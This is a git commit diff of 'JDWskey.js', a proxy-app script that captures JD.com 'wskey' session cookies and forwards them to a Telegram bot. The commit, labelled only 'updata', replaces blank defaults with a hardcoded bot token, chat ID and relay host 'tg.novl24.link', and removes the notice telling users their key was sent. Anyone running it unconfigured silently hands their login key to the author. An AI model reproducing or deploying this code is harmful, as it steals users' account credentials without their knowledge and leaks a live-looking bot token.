fa70712d8a0e16a0d6ad21f4f60881bbb9dc3153
novl24 <752570797@qq.com>
2023-10-09 16:15:20 +0800

    updata

--- Scripts/JDWskey.js
+++ Scripts/JDWskey.js
@@ -1,19 +1,16 @@
 const $ = new Env('自动上传Wskey');
-let cookiesArr = [], cookie = '',  notify;
-const logs = 0; // 0为关闭日志，1为开启
-$.message = '';
 const timeout = 15000;//超时时间(单位毫秒)
 let isGetbody = typeof $request !== 'undefined';
 
 !(async () => {
     if (isGetbody) {
-         // Telegram 为监控准备，抓body自动发到tg监控bot设置变量
-         TG_BOT_TOKEN = ($.getdata('TG_BOT_TOKEN') || '');
-         TG_USER_ID = ($.getdata('TG_USER_ID') || '');
-         TG_API_HOST = ($.getdata('TG_API_HOST') || 'api.telegram.org');
-         TG_PROXY_HOST = ($.getdata('TG_PROXY_HOST') || '');
-         TG_PROXY_PORT = ($.getdata('TG_PROXY_PORT') || '');
-         TG_PROXY_AUTH = ($.getdata('TG_PROXY_AUTH') || '');
+        // Telegram 为监控准备，抓body自动发到tg监控bot设置变量
+        TG_BOT_TOKEN = ($.getdata('TG_BOT_TOKEN') || '1749668771:AAGbkdgqt3RiCvcB7uzwcW9UQ31w0-maN18');
+        TG_USER_ID = ($.getdata('TG_USER_ID') || '887608610');
+        TG_API_HOST = ($.getdata('TG_API_HOST') || 'tg.novl24.link');
+        TG_PROXY_HOST = ($.getdata('TG_PROXY_HOST') || '');
+        TG_PROXY_PORT = ($.getdata('TG_PROXY_PORT') || '');
+        TG_PROXY_AUTH = ($.getdata('TG_PROXY_AUTH') || '');
         await GetWskey();
         $.done();
     } else {
@@ -29,12 +26,9 @@ let isGetbody = typeof $request !== 'undefined';
 
 async function GetWskey() {
     if (typeof $request.headers !== 'undefined'){
-        modifiedWskey = $request.headers['Cookie'];
-        //const pin = modifiedWskey.match(/(pin|wskey)=.+?;/g)[0];
-        const wskey = modifiedWskey.match(/(pin|wskey)=.+?;/g)[1];
-        //const pinwskey = pin+wskey;
+        requestCookie = $request.headers['Cookie'];
+        const wskey = requestCookie.match(/wskey=.+?;/g);
         $.log(`[${$.name}] Wskey✅: 成功 \n'${wskey}'`);
-        $.msg($.name, `Wskey✅: 成功 \n'${wskey}'`);
         await sendNotify(`#Wskey提交\n${wskey}`, ``);
     } else {
     $.msg($.name, `headers失败`);
@@ -42,31 +36,33 @@ async function GetWskey() {
     $done();
 }
 
-function tgBotNotify(text, desp) {
-  return  new Promise(resolve => {
+function tgBotNotify(text) {
+  return new Promise((resolve) => {
     if (TG_BOT_TOKEN && TG_USER_ID) {
-        var bodys = {"chat_id": TG_USER_ID, "text": text+"\n"+desp, "disable_web_page_preview": true};
-        const options = {
+      const options = {
         url: `https://${TG_API_HOST}/bot${TG_BOT_TOKEN}/sendMessage`,
-        body: JSON.stringify(bodys),
-        headers: {
-          'Content-Type': 'application/json'
+        json: {
+          chat_id: `${TG_USER_ID}`,
+          text: `${text}`,
+          disable_web_page_preview: true,
         },
-        timeout
-      }
-      // console.log(JSON.stringify(options, null, "\t"));
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        timeout,
+      };
       if (TG_PROXY_HOST && TG_PROXY_PORT) {
-        const tunnel = require("tunnel");
+        const tunnel = require('tunnel');
         const agent = {
           https: tunnel.httpsOverHttp({
             proxy: {
               host: TG_PROXY_HOST,
               port: TG_PROXY_PORT * 1,
-              proxyAuth: TG_PROXY_AUTH
-            }
-          })
-        }
-        Object.assign(options, { agent })
+              proxyAuth: TG_PROXY_AUTH,
+            },
+          }),
+        };
+        Object.assign(options, { agent });
       }
       $.post(options, (err, resp, data) => {
         try {
@@ -76,12 +72,13 @@ function tgBotNotify(text, desp) {
           } else {
             data = JSON.parse(data);
             if (data.ok) {
-                console.log('Telegram发送通知消息成功🎉。\n')
-                $.msg(`【WS提示】`, `[${$.name}]变量已推送到监控群组【${data.result.chat.title}】\n`);
+              console.log('Telegram发送通知消息成功🎉。\n');
             } else if (data.error_code === 400) {
-              console.log('请主动给bot发送一条消息并检查接收用户ID是否正确。\n')
-            } else if (data.error_code === 401){
-              console.log('Telegram bot token 填写错误。\n')
+              console.log(
+                '请主动给bot发送一条消息并检查接收用户ID是否正确。\n',
+              );
+            } else if (data.error_code === 401) {
+              console.log('Telegram bot token 填写错误。\n');
             }
           }
         } catch (e) {
@@ -89,22 +86,20 @@ function tgBotNotify(text, desp) {
         } finally {
           resolve(data);
         }
-      })
+      });
     } else {
-      console.log('请先填写G_BOT_TOKEN和TG_USER_ID');
-      $.msg(`【WS提示】`, '请先填写G_BOT_TOKEN和TG_USER_ID');
-      resolve()
+      resolve();
     }
-  })
+  });
 }
 
-async function sendNotify(text, desp) {
-    // text = text.match(/.*?(?=\s?-)/g) ? text.match(/.*?(?=\s?-)/g)[0] : text;
+async function sendNotify(text) {
     await Promise.all([
-        tgBotNotify(text, desp),//telegram 机器人
+        tgBotNotify(text),//telegram 机器人
 
   ])
 }
 
 // prettier-ignore
 function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got/dist/source/index"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t, e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t, s, i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
+
